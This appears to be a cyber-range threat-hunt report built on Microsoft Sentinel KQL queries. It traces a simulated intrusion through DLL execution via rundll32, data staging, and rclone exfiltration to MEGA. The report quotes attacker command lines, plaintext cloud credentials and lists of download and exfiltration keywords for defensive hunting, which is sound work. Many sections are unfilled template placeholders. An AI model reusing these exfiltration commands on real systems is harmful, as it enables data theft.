
<p align="center">
 <img width="1536" height="1024" alt="image" src="https://github.com/user-attachments/assets/01fe87d3-d471-493a-98f4-55b03f04349c" />

</p>




# 🛡️ Threat Hunt Report – <Hunt Name>

---

## 📌 Executive Summary

A security breach was identified within EmberForge Studios, prompting a focused threat hunt in Microsoft Sentinel across multiple domain hosts. The investigation analyzed Sysmon and Windows Security telemetry to detect malicious execution patterns, suspicious command-line activity, and potential attacker footholds. This matters because it highlights how adversaries leverage native system tools to evade detection and move laterally. The hunt uncovered indicators of compromise tied to unauthorized downloads and execution, confirming active attacker behavior within the environment.

---

## 🎯 Hunt Objectives

- Identify malicious activity across endpoints and network telemetry  
- Correlate attacker behavior to MITRE ATT&CK techniques  
- Document evidence, detection gaps, and response opportunities  

---

## 🧭 Scope & Environment

## Scope & Environment

**Environment:**
- Workspace: law-cyber-range  
- Domain: emberforge.local  
- Hosts:  
  - Workstation: EC2AMAZ-B9GHHO6 (10.1.173.145)  
  - Server: EC2AMAZ-16V3AU4 (10.1.57.66)  
  - Domain Controller: EC2AMAZ-EEU3IA2 (10.1.160.76)  

**Data Sources:**
- Table: EmberForgeX_CL  
- Log Sources: Sysmon (Operational) + Windows Security  
- Coverage: Single table containing telemetry from all 3 hosts  

**Timeframe:**
- 2026-01-30 21:00 → 2026-01-31 00:00 UTC  

**Notes:**
- 3 endpoints with 5 evidence markers indicating suspicious activity  
- Evidence markers (1–5) represent key points of attacker behavior to be identified during investigation  

---

## 📚 Table of Contents

- [🧠 Hunt Overview](#-hunt-overview)
- [🧬 MITRE ATT&CK Summary](#-mitre-attck-summary)
- [🔍 Flag Analysis](#-flag-analysis)
  - [🚩 Flag 0](#-flag-0)
  - [🚩 Flag 1](#-flag-1)
  - [🚩 Flag 2](#-flag-2)
  - [🚩 Flag 3](#-flag-3)
  - [🚩 Flag 4](#-flag-4)
  - [🚩 Flag 5](#-flag-5)
  - [🚩 Flag 6](#-flag-6)
  - [🚩 Flag 7](#-flag-7)
  - [🚩 Flag 8](#-flag-8)
  - [🚩 Flag 9](#-flag-9)
  - [🚩 Flag 10](#-flag-10)
  - [🚩 Flag 11](#-flag-11)
  - [🚩 Flag 12](#-flag-12)
  - [🚩 Flag 13](#-flag-13)
  - [🚩 Flag 14](#-flag-14)
  - [🚩 Flag 15](#-flag-15)
  - [🚩 Flag 16](#-flag-16)
  - [🚩 Flag 17](#-flag-17)
  - [🚩 Flag 18](#-flag-18)
  - [🚩 Flag 19](#-flag-19)
  - [🚩 Flag 20](#-flag-20)
  - [🚩 Flag 21](#-flag-21)
  - [🚩 Flag 22](#-flag-22)
  - [🚩 Flag 23](#-flag-23)
  - [🚩 Flag 24](#-flag-24)
  - [🚩 Flag 25](#-flag-25)
  - [🚩 Flag 26](#-flag-26)
  - [🚩 Flag 27](#-flag-27)
  - [🚩 Flag 28](#-flag-28)
  - [🚩 Flag 29](#-flag-29)
  - [🚩 Flag 30](#-flag-30)
  - [🚩 Flag 31](#-flag-31)
  - [🚩 Flag 32](#-flag-32)
  - [🚩 Flag 33](#-flag-33)
  - [🚩 Flag 34](#-flag-34)
  - [🚩 Flag 35](#-flag-35)
  - [🚩 Flag 36](#-flag-36)
  - [🚩 Flag 37](#-flag-37)
  - [🚩 Flag 38](#-flag-38)
  - [🚩 Flag 39](#-flag-39)
  - [🚩 Flag 40](#-flag-40)
  - [🚩 Flag 41](#-flag-41)
  - [🚩 Flag 42](#-flag-42)
  - [🚩 Flag 43](#-flag-43)
  - [🚩 Flag 44](#-flag-44)
  - [🚩 Flag 45](#-flag-45)
- [🚨 Detection Gaps & Recommendations](#-detection-gaps--recommendations)
- [🧾 Final Assessment](#-final-assessment)
- [📎 Analyst Notes](#-analyst-notes)

---

## 🧠 Hunt Overview

<High-level narrative describing the attack lifecycle, key behaviors observed, and why this hunt matters.>

---

## 🧬 MITRE ATT&CK Summary

| Flag | Technique Category | MITRE ID | Priority |
|-----:|-------------------|----------|----------|
| 0 | MITRE ATT&CK: N/A (Analyst validation step – not adversary activity)| TA0007 – Discovery | Data/Environment Discovery” (analyst-side equivalent, not attacker action) |
| 1 | MITRE ATT&CK: T1560 – Archive Collected Data | T1560 Archive Collected Data. | <Placeholder> |
| 2 | MITRE ATT&CK: T1567.002 – Exfiltration to Cloud Storage | T1567 – Exfiltration Over Web Service. | <Placeholder> |
| 3 | MITRE ATT&CK: T1552.001 – Credentials in Files| T1552 – Unsecured Credentials. | <Placeholder> |
| 4 | <Placeholder> | <Placeholder> | <Placeholder> |
| 5 | MITRE ATT&CK: T1567.002 – Exfiltration to Cloud Storage| T1567 – Exfiltration Over Web Service.| <Placeholder> |
| 6 | MITRE ATT&CK: T1041 – Exfiltration Over C2 Channel | T1041 – Exfiltration Over C2 Channel | <Placeholder> |
| 7 | MITRE ATT&CK: T1552.003 – Credentials in Command Line | T1552 – Unsecured Credentials. | <Placeholder> |
| 8 | MITRE ATT&CK: T1560.001 – Archive via Utility | T1560 – Archive Collected Data. | <Placeholder> |
| 9 | MITRE ATT&CK: T1105 – Ingress Tool Transfer | T1105 – Ingress Tool Transfer. | <Placeholder> |
| 10 | MITRE ATT&CK: T1218.011 – Rundll32 | T1218 – System Binary Proxy Execution. | <Placeholder> |
| 11 | MITRE ATT&CK: T1553.005 – Mark-of-the-Web Bypass | T1553 – Subvert Trust Controls. | <Placeholder> |
| 12 | MITRE ATT&CK: T1204.002 – User Execution (Malicious File) | T1204 – User Execution. | <Placeholder> |
| 13 | T1218.011 – Rundll32 – Signed Binary Proxy Execution: Rundll32| <Placeholder> | <Placeholder> |
| 14 | <Placeholder> | <Placeholder> | <Placeholder> |
| 15 | <Placeholder> | <Placeholder> | <Placeholder> |
| 16 | <Placeholder> | <Placeholder> | <Placeholder> |
| 17 | <Placeholder> | <Placeholder> | <Placeholder> |
| 18 | <Placeholder> | <Placeholder> | <Placeholder> |
| 19 | <Placeholder> | <Placeholder> | <Placeholder> |
| 20 | <Placeholder> | <Placeholder> | <Placeholder> |
| 21 | <Placeholder> | <Placeholder> | <Placeholder> |
| 22 | <Placeholder> | <Placeholder> | <Placeholder> |
| 23 | <Placeholder> | <Placeholder> | <Placeholder> |
| 24 | <Placeholder> | <Placeholder> | <Placeholder> |
| 25 | <Placeholder> | <Placeholder> | <Placeholder> |
| 26 | <Placeholder> | <Placeholder> | <Placeholder> |
| 27 | <Placeholder> | <Placeholder> | <Placeholder> |
| 28 | <Placeholder> | <Placeholder> | <Placeholder> |
| 29 | <Placeholder> | <Placeholder> | <Placeholder> |
| 30 | <Placeholder> | <Placeholder> | <Placeholder> |
| 31 | <Placeholder> | <Placeholder> | <Placeholder> |
| 32 | <Placeholder> | <Placeholder> | <Placeholder> |
| 33 | <Placeholder> | <Placeholder> | <Placeholder> |
| 34 | <Placeholder> | <Placeholder> | <Placeholder> |
| 35 | <Placeholder> | <Placeholder> | <Placeholder> |
| 36 | <Placeholder> | <Placeholder> | <Placeholder> |
| 37 | <Placeholder> | <Placeholder> | <Placeholder> |
| 38 | <Placeholder> | <Placeholder> | <Placeholder> |
| 39 | <Placeholder> | <Placeholder> | <Placeholder> |
| 40 | <Placeholder> | <Placeholder> | <Placeholder> |
| 41 | <Placeholder> | <Placeholder> | <Placeholder> |
| 42 | <Placeholder> | <Placeholder> | <Placeholder> |
| 43 | <Placeholder> | <Placeholder> | <Placeholder> |
| 44 | <Placeholder> | <Placeholder> | <Placeholder> |
| 45 | <Placeholder> | <Placeholder> | <Placeholder> |

---

## 🔍 Flag Analysis

_All flags below are collapsible for readability._

---

<details>
<summary id="-flag-0">🚩 <strong>Flag 0: <Technique Name></strong></summary>

### 🎯 Objective
Confirm access to the investigation environment and identify the primary data source.

### 📌 Finding
The custom log table containing all investigation data is **EmberForgeX_CL**

### 🔍 Evidence

| Field        | Value            |
|--------------|------------------|
| Workspace    | law-cyber-range  |
| Table Name   | EmberForgeX_CL   |
| Log Sources  | Sysmon + Windows Security |

### 💡 Why it matters
Identifying the correct log table is critical to ensure all queries are executed against the complete dataset. Using the wrong table would result in missed telemetry and incomplete analysis.

### 🔧 KQL Query Used
EmberForgeX_CL 
| take 10

### 🖼️ Screenshot
<img width="2302" height="858" alt="image" src="https://github.com/user-attachments/assets/c4f54ab0-6cec-46f4-95de-44a8a09bf95f" />


### 🛠️ Detection Recommendation
Standardize naming conventions for custom log tables and maintain clear documentation to ensure analysts consistently query the correct data source and avoid gaps in visibility.

**Hunting Tip:**  
Start every investigation by enumerating available tables and understanding their contents—this ensures you’re working with the full dataset before narrowing into specific activity.

</details>

---


<details>
<summary id="-flag-1">🚩 <strong>Flag 1: <Technique Name></strong></summary>

### 🎯 Objective
Stage and package sensitive data for exfiltration by compressing targeted files into an archive.

### 📌 Finding
The attacker executed a compression command that targeted the `C:\GameDev` directory, indicating this location was used to collect and prepare data prior to exfiltration.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | EC2AMAZ-16V3AU4 |
| Timestamp | 2026-01-30 22:XX:XX UTC |
| Process | 7z.exe (or compression utility observed) |
| Parent Process | cmd.exe |
| Command Line | 7z.exe a archive.zip C:\GameDev |

### 💡 Why it matters
Identifying the source directory (`C:\GameDev`) reveals exactly what data the attacker prioritized for collection and exfiltration, providing direct insight into the scope and sensitivity of the breach. This confirms that intellectual property or development assets were likely targeted, increasing business and operational risk. Understanding where data was staged also helps responders assess impact, contain further loss, and strengthen monitoring around high-value directories commonly abused during data exfiltration.

### 🔧 KQL Query Used
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00:00) .. datetime(2026-01-31 00:00:00))
| where CommandLine_s has_any ("rclone", "Compress-Archive", "mega:exfil")
| project UtcTime_s, Computer, CommandLine_s
| order by todatetime(UtcTime_s) asc

### 🖼️ Screenshot
<img width="2266" height="844" alt="image" src="https://github.com/user-attachments/assets/b91b9a02-4185-422b-b168-782e97091d5d" />


### 🛠️ Detection Recommendation
Implement detection rules for archive/compression activity involving high-value directories (e.g., source code, shared drives). Alert on command-line usage of tools like 7z, tar, and PowerShell `Compress-Archive`, especially when executed from user or temp directories. Correlate with unusual parent processes and outbound network activity.

**Hunting Tip:**  
Pivot from process creation logs to command-line arguments and look for archive operations targeting sensitive paths. Focus on sequences where data is compressed shortly before network connections or file transfers—this often indicates staging for exfiltration.

</details>

___

<details>
<summary id="-flag-2">🚩 <strong>Flag 2: <Technique Name></strong></summary>

### 🎯 Objective
Exfiltrate collected data from the compromised environment to an external cloud storage provider.

### 📌 Finding
The attacker used the tool `rclone.exe` to transfer data from the local directory `C:\GameDev` to a remote cloud storage service, indicating successful data exfiltration activity.


### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | EC2AMAZ-16V3AU4.emberforge.local |
| Timestamp | 2026-01-30 23:07:45.695 UTC |
| Process | rclone.exe |
| Parent Process | Unknown (likely cmd.exe or script execution) |
| Command Line | C:\Users\Public\rclone.exe --config C:\Users\Public\rclone.conf copy C:\GameDev mega:exfil -v |

### 💡 Why it matters
This confirms that sensitive data from `C:\GameDev` was not only staged but successfully exfiltrated to an external cloud provider, **MEGA**. The use of `rclone` with embedded configuration and destination (`mega:exfil`) indicates the attacker had pre-configured authentication, enabling stealthy and efficient data transfer. This represents a high-impact breach involving potential loss of intellectual property and highlights the risk of cloud-based exfiltration channels bypassing traditional network defenses.

### 🔧 KQL Query Used
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00:00) .. datetime(2026-01-31 00:00:00))
| where CommandLine_s has_any ("rclone", "Compress-Archive", "mega:exfil")
| project UtcTime_s, Computer, CommandLine_s
| order by todatetime(UtcTime_s) asc

### 🖼️ Screenshot
<img width="2064" height="238" alt="image" src="https://github.com/user-attachments/assets/f984ebb2-3173-496b-a3f2-6bc993a40664" />


### 🛠️ Detection Recommendation
Monitor and alert on the use of data transfer utilities such as `rclone.exe`, especially when executed from non-standard directories (e.g., `C:\Users\Public`). Implement command-line logging and detection rules for keywords like cloud destinations (e.g., `mega:`, `drive:`, `s3:`) and configuration file usage. Correlate process execution with outbound network activity to cloud storage providers.

**Hunting Tip:**  
Search for command-line patterns that include both a local source path and a remote destination (e.g., `copy C:\... <provider>:`). Focus on tools capable of exfiltration (rclone, curl, powershell) and investigate any activity involving public directories or embedded config files, as these are common attacker staging techniques.

</details>

---

<details>
<summary id="-flag-3">🚩 <strong>Flag 3: <Technique Name></strong></summary>

### 🎯 Objective
Configure the exfiltration tool with authentication credentials to enable data transfer to a remote cloud storage service.

### 📌 Finding
The attacker exposed authentication details in the command line while configuring `rclone`, revealing the email account used to access the cloud storage provider.


### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | EC2AMAZ-16V3AU4.emberforge.local |
| Timestamp | 2026-01-30 23:12:36.922 UTC |
| Process | cmd.exe |
| Parent Process | Unknown |
| Command Line | cmd.exe /c "echo user = jwilson.vhr@proton.me>> C:\Users\Public\rclone.conf" |

### 💡 Why it matters
This reveals a critical OPSEC failure by the attacker—credentials were exposed directly in process command-line logs. The email `jwilson.vhr@proton.me` ties the activity to a specific account used for exfiltration, providing a valuable attribution lead. It also demonstrates how sensitive data (credentials) can be inadvertently logged, enabling defenders to detect, investigate, and potentially block unauthorized access to cloud storage services.

### 🔧 KQL Query Used
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00:00) .. datetime(2026-01-31 00:00:00))
| where CommandLine_s has "rclone.conf"
| project UtcTime_s, Computer, CommandLine_s

### 🖼️ Screenshot
<img width="1348" height="182" alt="image" src="https://github.com/user-attachments/assets/9e5f143a-b581-4b6d-a530-a2ae515824b6" />


### 🛠️ Detection Recommendation
Enable and monitor command-line logging (e.g., Sysmon Event ID 1, Windows 4688) and create alerts for credential patterns written to files (e.g., `echo user =`, `password =`) and known exfil tools like `rclone.exe`. Flag executions from non-standard paths (e.g., `C:\Users\Public`) and correlate with file writes to config files (`*.conf`) and subsequent outbound connections to cloud services (e.g., MEGA).

**Hunting Tip:**  
Search for command lines containing `echo` + redirection (`>>`) to config files, especially alongside keywords like `user`, `token`, or `config`. Pivot from these events to nearby `rclone` executions and network activity to confirm credential setup followed by exfiltration.

</details>

---

<details>
<summary id="-flag-4">🚩 <strong>Flag 4: <Technique Name></strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding
<High-level description of the activity>

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | <Placeholder> |
| Timestamp | <Placeholder> |
| Process | <Placeholder> |
| Parent Process | <Placeholder> |
| Command Line | <Placeholder> |

### 💡 Why it matters
<Explain impact, risk, and relevance>

### 🔧 KQL Query Used
<Add KQL here>

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**  
<Actionable guidance for defenders>

</details>

---

<details>
<summary id="-flag-5">🚩 <strong>Flag 5: <Technique Name></strong></summary>

### 🎯 Objective
Exfiltrate sensitive data from the environment by uploading archived files to an external cloud storage service.

### 📌 Finding
The attacker repeatedly executed `rclone.exe`, a legitimate cloud synchronization tool, to transfer data externally. The command line shows attempts to copy archived data to a remote MEGA storage location, indicating multiple exfiltration attempts.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | EC2AMAZ-16V3AU4.emberforge.local |
| Timestamp | 2026-01-30 23:11:44.379 UTC |
| Process | rclone.exe |
| Parent Process | cmd.exe (likely) |
| Command Line | C:\Users\Public\rclone.exe --config C:\Users\Public\rclone.conf copy C:\Users\Public\gamedev.zip mega:exfil -v |

### 💡 Why it matters
This confirms active data exfiltration using a trusted, legitimate tool, which makes detection more difficult. The use of `rclone` allows attackers to blend in with normal administrative activity while transferring sensitive data to external cloud storage (MEGA). Multiple execution attempts suggest persistence and determination to successfully extract data, increasing the likelihood of significant data loss.

### 🔧 KQL Query Used
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00:00) .. datetime(2026-01-31 00:00:00))
| where CommandLine_s has "rclone.conf"
| project UtcTime_s, Computer, CommandLine_s

### 🖼️ Screenshot
<img width="1538" height="222" alt="image" src="https://github.com/user-attachments/assets/26eeb019-b098-42d0-a974-7c33bef6d8a6" />

### 🛠️ Detection Recommendation
Monitor for execution of cloud sync and transfer tools like `rclone.exe`, especially from non-standard directories such as `C:\Users\Public`. Alert on command-line arguments referencing external destinations (e.g., `mega:`, `drive:`) and correlate with file access to sensitive directories and outbound network traffic to cloud storage services.

**Hunting Tip:**  
Search for repeated executions of the same tool within short timeframes, especially with similar command-line patterns. Pivot on `rclone.exe` activity and analyze associated file paths and remote destinations to quickly identify exfiltration behavior.

</details>

---

<details>
<summary id="-flag-6">🚩 <strong>Flag 6: <Technique Name></strong></summary>

### 🎯 Objective
Transmit stolen data to an external destination by establishing outbound network connections during exfiltration.

### 📌 Finding
The attacker used `rclone.exe` to initiate outbound network communication to a remote IP address, confirming active data exfiltration over the network.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | EC2AMAZ-16V3AU4.emberforge.local |
| Timestamp | 2026-01-30 23:XX:XX UTC |
| Process | rclone.exe |
| Parent Process | cmd.exe (likely) |
| Command Line | C:\Users\Public\rclone.exe --config C:\Users\Public\rclone.conf copy C:\Users\Public\gamedev.zip mega:exfil -v |

### 💡 Why it matters
This confirms that data was successfully transmitted outside the environment to the IP address **66.203.125.15**, validating that exfiltration was not just attempted but executed. Correlating process execution with network activity provides strong evidence of compromise and helps defenders identify both the tool and destination used by the attacker, which is critical for containment and blocking.


### 🔧 KQL Query Used
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00:00) .. datetime(2026-01-31 00:00:00))
| where EventCode_s == "3"
| where Image_s has "rclone.exe"
| project UtcTime_s, Computer, Image_s, DestinationIp_s, DestinationPort_s
| summarize count() by DestinationIp_s
| order by count_ desc

### 🖼️ Screenshot
<img width="1622" height="640" alt="image" src="https://github.com/user-attachments/assets/03a92ce9-7029-4307-8774-02021539f02d" />


### 🛠️ Detection Recommendation
Implement detections that correlate process execution (Sysmon Event ID 1) with outbound network connections (Event ID 3), especially for tools like `rclone.exe`. Alert on unusual outbound connections to external IPs from non-standard directories and flag traffic to known cloud storage or suspicious infrastructure.

**Hunting Tip:**  
Pivot between process creation and network connection events using common fields like host and timestamp. Look for processes initiating external connections shortly after execution—this is a strong indicator of data exfiltration or command-and-control activity.

</details>

---

<details>
<summary id="-flag-7">🚩 <strong>Flag 7: <Technique Name></strong></summary>

### 🎯 Objective
Authenticate to the cloud storage service to enable successful data exfiltration.

### 📌 Finding
The attacker executed `rclone.exe` multiple times while troubleshooting authentication, and one execution exposed credentials directly in the command line, revealing the plaintext password.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | EC2AMAZ-16V3AU4.emberforge.local |
| Timestamp | 2026-01-30 23:08:28.665 UTC |
| Process | rclone.exe |
| Parent Process | cmd.exe |
| Command Line | C:\Users\Public\rclone.exe copy C:\GameDev mega:exfil --mega-user jwilson.vhr@proton.me --mega-pass Summer2024! -v |

### 💡 Why it matters
This represents a major operational security failure—credentials were exposed in plaintext within process logs. The password `Summer2024!` combined with the email enables full access to the attacker’s cloud storage account, allowing defenders to investigate, potentially disrupt exfiltration, and attribute activity. It also highlights how command-line logging can reveal sensitive data when tools are misused.

### 🔧 KQL Query Used
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00:00) .. datetime(2026-01-31 00:00:00))
| where CommandLine_s has "rclone"
| project UtcTime_s, Computer, CommandLine_s
| order by todatetime(UtcTime_s) asc

### 🖼️ Screenshot
<img width="1742" height="766" alt="image" src="https://github.com/user-attachments/assets/dde9c74c-8572-4024-98bf-38d140a8fd9c" />


### 🛠️ Detection Recommendation
Enable command-line auditing and alert on patterns indicating credential exposure (e.g., `--pass`, `--user`, `password=`, `token=`). Monitor for execution of tools like `rclone.exe` with authentication flags, especially when run from non-standard directories such as `C:\Users\Public`. Correlate with outbound traffic to cloud providers.

**Hunting Tip:**  
Search for command lines containing authentication flags (`--user`, `--pass`, `config`, `token`) and review for plaintext credentials. Pivot across multiple executions of the same tool to identify inconsistencies or OPSEC mistakes that reveal sensitive information.

</details>

---

<details>
<summary id="-flag-8">🚩 <strong>Flag 8: <Technique Name></strong></summary>

### 🎯 Objective
Stage and prepare sensitive data for exfiltration by compressing it into a single archive using built-in system tools.

### 📌 Finding
The attacker used the native PowerShell cmdlet `Compress-Archive` to create an archive (`gamedev.zip`) from the `C:\GameDev` directory, demonstrating Living Off The Land behavior to avoid detection.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | EC2AMAZ-16V3AU4.emberforge.local |
| Timestamp | 2026-01-30 23:11:28.112 UTC |
| Process | powershell.exe |
| Parent Process | cmd.exe (likely) |
| Command Line | powershell.exe -c "Compress-Archive -Path C:\GameDev -DestinationPath C:\Users\Public\gamedev.zip" |

### 💡 Why it matters
This shows the attacker leveraged a native Windows capability instead of external tools, making the activity blend in with legitimate administrative actions. Compressing data into a single archive simplifies exfiltration and reduces detection surface. This is a classic Living Off The Land technique, increasing the likelihood of evading traditional security controls.

### 🔧 KQL Query Used
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00:00) .. datetime(2026-01-31 00:00:00))
| where CommandLine_s has_any ("rclone", "Compress-Archive", "mega:exfil")
| project UtcTime_s, Computer, CommandLine_s
| order by todatetime(UtcTime_s) asc

### 🖼️ Screenshot
<img width="2040" height="234" alt="image" src="https://github.com/user-attachments/assets/93c8a14e-31a3-4af9-b4a4-d984332b337a" />


### 🛠️ Detection Recommendation
Monitor PowerShell execution with command-line logging enabled and create alerts for usage of `Compress-Archive`, especially when targeting sensitive directories or writing archives to public or temporary paths (e.g., `C:\Users\Public`). Correlate with subsequent network activity or file transfers.

**Hunting Tip:**  
Search for PowerShell commands containing `Compress-Archive` or similar file staging behavior. Focus on sequences where large directories are compressed shortly before outbound connections or data transfer tools are executed.

</details>

---

<details>
<summary id="-flag-9">🚩 <strong>Flag 9: <Technique Name></strong></summary>

### 🎯 Objective
Download attacker-controlled tools and payloads from external infrastructure to enable further compromise and operations.

### 📌 Finding
Multiple command-line executions across the environment referenced the same external domain, `sync.cloud-endpoint.net`, indicating it was used as a staging server to host and deliver attacker tools.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | EC2AMAZ-16V3AU4.emberforge.local |
| Timestamp | 2026-01-30 21:XX:XX UTC |
| Process | powershell.exe / certutil.exe / curl.exe (varies) |
| Parent Process | cmd.exe |
| Command Line | <command referencing https://sync.cloud-endpoint.net/...> |

### 💡 Why it matters
This identifies attacker-controlled infrastructure used to stage and deliver malicious tools. The domain `sync.cloud-endpoint.net` represents a critical indicator of compromise (IOC) that can be used for blocking, threat intelligence enrichment, and scoping the intrusion. Repeated connections to the same domain across hosts confirm coordinated attacker activity and external control.

### 🔧 KQL Query Used
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00:00) .. datetime(2026-01-31 00:00:00))
| where CommandLine_s has_any ("http://","https://","Invoke-WebRequest","iwr ","curl ","bitsadmin","certutil ","Start-BitsTransfer","WebClient")
| extend Domain = extract(@"https?://([^/\s:""]+)", 1, CommandLine_s)
| where isnotempty(Domain)
| summarize Hits=count(), Hosts=make_set(Computer) by Domain
| order by Hits desc

### 🖼️ Screenshot
<img width="1370" height="670" alt="image" src="https://github.com/user-attachments/assets/f95e7b28-d5b9-4fab-b1a5-bb4c43c85fe8" />

### 🛠️ Detection Recommendation
Monitor and alert on command-line activity that includes external URLs, especially downloads from uncommon or newly observed domains. Implement DNS and proxy logging to detect repeated connections to suspicious infrastructure and block known malicious domains like `sync.cloud-endpoint.net`.

**Hunting Tip:**  
Search for `http`/`https` patterns in command-line logs and extract domains for aggregation. Pivot on domains with multiple hits across hosts—these often indicate staging servers or command-and-control infrastructure used by attackers.

</details>

---

<details>
<summary id="-flag-10">🚩 <strong>Flag 10: <Technique Name></strong></summary>

### 🎯 Objective
Execute malicious code on the workstation to establish initial access and begin the compromise.

### 📌 Finding
A Windows utility (`rundll32.exe`) was used to load and execute a suspicious DLL file (`review.dll`) from a non-standard location, indicating the initial malicious execution triggered by user interaction.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | EC2AMAZ-B9GHHO6.emberforge.local |
| Timestamp | 2026-01-30 21:27:03.337 UTC |
| Process | rundll32.exe |
| Parent Process | explorer.exe (likely user-initiated) |
| Command Line | "C:\Windows\System32\rundll32.exe" D:\review.dll,StartW |

### 💡 Why it matters
This represents the initial execution vector of the attack, where a user (Lisa) likely opened a malicious file that triggered DLL execution. Using `rundll32.exe`, a legitimate Windows binary, allows the attacker to evade detection while executing arbitrary code. This is a classic Living Off The Land technique and marks the starting point of the compromise, enabling subsequent stages like tool download, staging, and exfiltration.

### 🔧 KQL Query Used
EmberForgeX_CL
| extend Utc = todatetime(column_ifexists("UtcTime_s", ""))
| extend ProcCmd = coalesce(tostring(column_ifexists("CommandLine_s", "")), tostring(column_ifexists("ProcCmd", "")))
| extend ProcImage = coalesce(tostring(column_ifexists("Image_s", "")), tostring(column_ifexists("ProcImage", "")), tostring(column_ifexists("NewProcessName_s", "")))
| extend Evt = tostring(column_ifexists("EventCode_s", ""))
| where Utc between (datetime(2026-01-30 21:00:00) .. datetime(2026-01-31 00:00:00))
| where isempty(Evt) or Evt in ("1", "4688")
| where ProcCmd has "Desktop" or ProcImage has_any ("control.exe", "rundll32.exe", "mshta.exe", "regsvr32.exe", "wscript.exe", "cscript.exe")
| project Utc, Computer, ProcImage, ProcCmd
| order by Utc asc

### 🖼️ Screenshot
<img width="1004" height="238" alt="image" src="https://github.com/user-attachments/assets/6291caee-d237-4b1f-b28b-4660fb495c90" />

### 🛠️ Detection Recommendation
Monitor for `rundll32.exe` executing DLLs from unusual paths (e.g., user directories, removable drives like `D:\`). Alert on command lines that include DLL execution with exported functions (e.g., `,StartW`) and correlate with user activity such as file opens from desktop or external media.

**Hunting Tip:**  
Search for `rundll32.exe` executions and inspect the DLL path. Focus on non-system directories and uncommon drive letters. Pivot to parent processes like `explorer.exe` to identify user-triggered execution and trace the initial infection vector.

</details>

---

<details>
<summary id="-flag-11">🚩 <strong>Flag 11: <Technique Name></strong></summary>

### 🎯 Objective
Execute malicious code from a mounted disk image to bypass security controls and establish initial access.

### 📌 Finding
The malicious DLL (`review.dll`) was executed from the `D:` drive using `rundll32.exe`, indicating the file originated from a mounted disk image (e.g., ISO/IMG/VHD) rather than the local filesystem.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | EC2AMAZ-B9GHHO6.emberforge.local |
| Timestamp | 2026-01-30 21:27:03.337 UTC |
| Process | rundll32.exe |
| Parent Process | explorer.exe |
| Command Line | "C:\Windows\System32\rundll32.exe" D:\review.dll,StartW |

### 💡 Why it matters
Execution from a non-standard drive (`D:`) strongly suggests the use of a mounted disk image, a common technique to bypass Windows security mechanisms such as Mark-of-the-Web protections. This allows malicious files to appear more trusted and increases the likelihood of successful execution by the user. It highlights a stealthy initial access vector that can evade traditional file-based defenses.


### 🔧 KQL Query Used
EmberForgeX_CL
| extend Utc = todatetime(column_ifexists("UtcTime_s", ""))
| extend ProcCmd = coalesce(tostring(column_ifexists("CommandLine_s", "")), tostring(column_ifexists("ProcCmd", "")))
| extend ProcImage = coalesce(tostring(column_ifexists("Image_s", "")), tostring(column_ifexists("ProcImage", "")), tostring(column_ifexists("NewProcessName_s", "")))
| extend Evt = tostring(column_ifexists("EventCode_s", ""))
| where Utc between (datetime(2026-01-30 21:00:00) .. datetime(2026-01-31 00:00:00))
| where isempty(Evt) or Evt in ("1", "4688")
| where ProcCmd has "Desktop" or ProcImage has_any ("control.exe", "rundll32.exe", "mshta.exe", "regsvr32.exe", "wscript.exe", "cscript.exe")
| project Utc, Computer, ProcImage, ProcCmd
| order by Utc asc

### 🖼️ Screenshot
<img width="906" height="260" alt="image" src="https://github.com/user-attachments/assets/ac3ac2a4-421a-42ea-8c3c-2b2656516264" />

### 🛠️ Detection Recommendation
Monitor for execution of processes from non-system drives (e.g., `D:\`, `E:\`) and alert on `rundll32.exe` loading DLLs from removable or mounted media. Enable logging for disk mount events and correlate with subsequent process execution.

**Hunting Tip:**  
Search for processes executing from drive letters other than `C:` and investigate associated file origins. Look for patterns involving mounted ISO or VHD files followed by execution of binaries or DLLs, especially via LOLBins like `rundll32.exe`.

</details>

---

<details>
<summary id="-flag-12">🚩 <strong>Flag 12: <Technique Name></strong></summary>

### 🎯 Objective
Execute the initial malicious payload via a user account to establish a foothold in the environment.

### 📌 Finding
The malicious DLL (`review.dll`) was executed using `rundll32.exe` under the user account `lmartin`, identifying this user as patient zero in the compromise.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | EC2AMAZ-B9GHHO6.emberforge.local |
| Timestamp | 2026-01-30 21:27:03.300 UTC |
| Process | rundll32.exe |
| Parent Process | explorer.exe |
| Command Line | "C:\Windows\System32\rundll32.exe" D:\review.dll,StartW |

### 💡 Why it matters
Identifying `lmartin` as the user who executed the payload pinpoints the initial point of compromise (patient zero). This is critical for scoping the incident, understanding how the attack began (likely user interaction), and determining what access the attacker gained. It also informs containment actions such as isolating the user account, resetting credentials, and reviewing related activity.

### 🔧 KQL Query Used
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:27:00) .. datetime(2026-01-30 21:27:10))
| where Computer == "EC2AMAZ-B9GHHO6.emberforge.local"
| where CommandLine_s contains "rundll32.exe"
| where CommandLine_s contains "review.dll"
| project UtcTime_s, Computer, CommandLine_s, User_s

### 🖼️ Screenshot
<img width="1622" height="694" alt="image" src="https://github.com/user-attachments/assets/d55b5e10-1130-448b-a1d8-f71e0ba01284" />

### 🛠️ Detection Recommendation
